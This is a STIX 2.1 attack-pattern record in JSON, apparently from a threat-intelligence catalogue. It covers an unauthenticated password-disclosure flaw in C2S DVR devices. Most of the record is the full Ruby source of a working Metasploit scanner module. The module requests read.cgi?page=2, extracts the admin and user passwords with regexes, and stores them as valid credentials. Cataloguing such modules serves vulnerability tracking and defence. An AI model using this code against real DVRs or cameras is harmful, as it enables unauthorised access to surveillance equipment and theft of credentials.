{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--eebf4a13-298c-4cf8-82db-2107d996d375",
    "created": "2024-08-14T16:31:26.839778Z",
    "modified": "2024-08-14T16:31:26.839782Z",
    "name": "C2S DVR Management Password Disclosure",
    "description": " C2S DVR allows an unauthenticated user to disclose the username & password by requesting the javascript page 'read.cgi?page=2'. This may also work on some cameras including IRDOME-II-C2S, IRBOX-II-C2S.  'References'   => [['EDB', '40265']]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/c2s_dvr_password_disclosure.rb",
            "external_id": "c2s_dvr_password_disclosure.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'         => 'C2S DVR Management Password Disclosure',\n      'Description'  => %q{\n        C2S DVR allows an unauthenticated user to disclose the username\n        & password by requesting the javascript page 'read.cgi?page=2'.\n        This may also work on some cameras including IRDOME-II-C2S, IRBOX-II-C2S.\n      },\n      'References'   => [['EDB', '40265']],\n      'Author'       =>\n        [\n          'Yakir Wizman', # discovery\n          'h00die',    # module\n        ],\n      'License'      => MSF_LICENSE,\n      'DisclosureDate' => 'Aug 19 2016'\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [false, 'URL of the C2S DVR root', '/'])\n    ])\n  end\n\n  def run_host(rhost)\n    begin\n      url = normalize_uri(datastore['TARGETURI'], 'cgi-bin', 'read.cgi')\n      vprint_status(\"Attempting to load data from #{url}?page=2\")\n      res = send_request_cgi({\n        'uri'      => url,\n        'vars_get' => {'page'=>'2'}\n      })\n      unless res\n        print_error(\"#{peer} Unable to connect to #{url}\")\n        return\n      end\n\n      unless res.body.include?('pw_enflag')\n        print_error(\"Invalid response received for #{peer} for #{url}\")\n        return\n      end\n\n      if res.body =~ /pw_adminpw = \"(.+?)\";/\n        print_good(\"Found: admin:#{$1}\")\n        store_valid_credential(\n          user:         'admin',\n          private:      $1,\n          private_type: :password\n        )\n      end\n\n      if res.body =~ /pw_userpw = \"(.+?)\";/\n        print_good(\"Found: user:#{$1}\")\n        store_valid_credential(\n          user:         'user',\n          private:      $1,\n          private_type: :password\n        )\n      end\n    rescue ::Rex::ConnectionError\n      print_error(\"#{peer} Unable to connect to site\")\n      return\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "Aug 19 2016"
}